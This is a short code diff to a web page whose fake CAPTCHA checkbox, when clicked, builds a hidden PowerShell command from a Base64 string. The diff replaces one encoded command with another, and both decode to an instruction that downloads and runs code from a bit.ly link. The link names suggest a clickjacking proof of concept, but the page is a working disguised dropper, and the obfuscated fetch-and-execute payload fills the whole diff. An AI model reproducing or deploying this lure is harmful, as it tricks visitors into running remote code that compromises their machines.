@@ -57,7 +57,7 @@
    <script>
     document.getElementById('captchaCheckbox').addEventListener('click', () => {
         // Correct Base64-encoded PowerShell command
-        const encodedCommand = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwBsAHIAdwBjAGwAaQBjAGsAagBhAGMAawBwAG8AYwAnACkALgBDAG8AbgB0AGUAbgB0ADsA";
+        const encodedCommand = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwBjAGwAaQBjAGsAagBhAGMAawBpAG4AZwBwAG8AYwAyADAAMgA0ACcAKQAuAEMAbwBuAHQAZQBuAHQAOwA=";
 
         // Full PowerShell command
         const fullCommand = `powershell -WindowStyle Hidden -ec ${encodedCommand}`;
